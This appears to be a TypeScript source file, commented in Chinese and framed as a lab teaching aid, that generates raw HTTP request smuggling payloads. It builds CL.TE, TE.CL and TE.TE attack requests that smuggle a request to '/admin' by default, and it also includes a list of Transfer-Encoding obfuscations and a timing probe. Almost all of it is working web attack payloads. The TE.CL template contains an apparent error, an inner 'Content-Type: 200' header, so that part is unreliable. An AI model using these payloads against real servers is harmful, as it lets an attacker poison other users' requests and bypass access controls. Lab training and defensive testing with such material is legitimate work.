/**
 * HTTP 请求走私 —— 教学模板生成。纯函数，不发起任何请求。
 *
 * 内容：
 *  1. CL.TE / TE.CL / TE.TE 三类前端/后端解析分歧的原始请求模板
 *     （Content-Length 按字节精确计算，可直接贴进自己的靶场）
 *  2. Transfer-Encoding 混淆手法清单（TE.TE 里让一端退回 CL 的写法）
 *  3. 无危害的时间探测模板
 * 前置条件、验证步骤、修复建议的双语文案放在界面层。
 */

export interface SmugglingTemplate {
  id: 'clte' | 'tecl' | 'tete'
  /** 可复制的原始请求文本 */
  raw: string
}

export interface TeObfuscation {
  id: string
  value: string
}

const byteLen = (s: string): number => new TextEncoder().encode(s).length

/** 组一个 chunk：长度行(hex) + CRLF + body + CRLF */
function chunk(body: string): string {
  return `${byteLen(body).toString(16)}\r\n${body}\r\n`
}

export function buildSmugglingTemplates(opts: {
  host: string
  path: string
  /** 想夹带走私的请求路径（毒化下一个请求前缀用） */
  smuggledPath?: string
}): SmugglingTemplate[] {
  const host = opts.host || 'lab.local'
  const path = opts.path || '/'
  const smuggled = opts.smuggledPath || '/admin'

  // CL.TE：前端信 CL 整段转发；后端信 TE，读到 0 块结束，
  // 剩下的走私请求被拼到「下一个」请求前面。
  const clteTail = `GET ${smuggled} HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 6\r\n\r\nx=1\r\n\r\n`
  const clteBody = `0\r\n\r\n${clteTail}`
  const clte = [
    `POST ${path} HTTP/1.1`,
    `Host: ${host}`,
    'Content-Type: application/x-www-form-urlencoded',
    `Content-Length: ${byteLen(clteBody)}`,
    'Transfer-Encoding: chunked',
    '',
    clteBody,
  ].join('\r\n')

  // TE.CL：前端信 chunked 全部转发；后端只按 CL 取走「第一个 chunk 长度行」
  // 那么多字节，剩余部分成为下一个请求的前缀。
  const inner = `POST ${path} HTTP/1.1\r\nHost: ${host}\r\nContent-Type: 200\r\n\r\n`
  const firstChunk = chunk(inner) + '0\r\n\r\n'
  const teclHead = chunk(`GET ${smuggled} HTTP/1.1\r\nHost: ${host}\r\nFoo: bar`)
  const teclBody = teclHead + firstChunk
  const tecl = [
    `POST ${path} HTTP/1.1`,
    `Host: ${host}`,
    'Content-Type: application/x-www-form-urlencoded',
    `Content-Length: ${byteLen(teclHead.split('\r\n')[0] + '\r\n')}`,
    'Transfer-Encoding: chunked',
    '',
    teclBody,
  ].join('\r\n')

  // TE.TE：两端都「本应」信 TE，但其中一端因混淆头解析失败而回退 CL。
  const teteBody = `0\r\n\r\nGET ${smuggled} HTTP/1.1\r\nHost: ${host}\r\n\r\n`
  const tete = [
    `POST ${path} HTTP/1.1`,
    `Host: ${host}`,
    'Content-Type: application/x-www-form-urlencoded',
    `Content-Length: ${byteLen(teteBody)}`,
    'Transfer-Encoding: chunked',
    'Transfer-Encoding: cow',
    '',
    teteBody,
  ].join('\r\n')

  return [
    { id: 'clte', raw: clte },
    { id: 'tecl', raw: tecl },
    { id: 'tete', raw: tete },
  ]
}

/** TE 头混淆：让某一端解析器认不出 TE 从而退回 CL（PortSwigger 公开手法集） */
export const TE_VARIANTS: TeObfuscation[] = [
  { id: 'te.cow', value: 'Transfer-Encoding: cow' },
  { id: 'te.space', value: 'Transfer-Encoding : chunked' },
  { id: 'te.tab', value: 'Transfer-Encoding:\tchunked' },
  { id: 'te.unknownToken', value: 'Transfer-Encoding: xchunked' },
  { id: 'te.leadingSpace', value: ' Transfer-Encoding: chunked' },
  { id: 'te.extraSpace', value: 'Transfer-Encoding:  chunked' },
  { id: 'te.case', value: 'Transfer-Encoding: Chunked' },
  { id: 'te.obfuscatedName', value: 'TrAnSfEr-EnCoDiNg: chunked' },
  { id: 'te.beforeCl', value: 'Transfer-Encoding: chunked\r\nContent-Length: 8' },
  { id: 'te.afterCl', value: 'Content-Length: 8\r\nTransfer-Encoding: chunked' },
  { id: 'te.onlySpace', value: 'Transfer-Encoding:' },
  { id: 'te.identity', value: 'Transfer-Encoding: identity' },
]

/**
 * 无危害时间探测：前端按 CL 认为 body 已结束，后端按 chunked 等待下一块
 * 而挂起。只观察响应时间差，不毒化任何其他用户的请求。
 */
export function buildTimingProbe(host: string, path: string): string {
  const h = host || 'lab.local'
  const p = path || '/'
  // 末字节不完整：声明了块却不给终止块
  const body = `4\r\nAAAA\r\nX`
  return [
    `POST ${p} HTTP/1.1`,
    `Host: ${h}`,
    'Content-Type: application/x-www-form-urlencoded',
    `Content-Length: ${byteLen(body)}`,
    'Transfer-Encoding: chunked',
    '',
    body,
  ].join('\r\n')
}
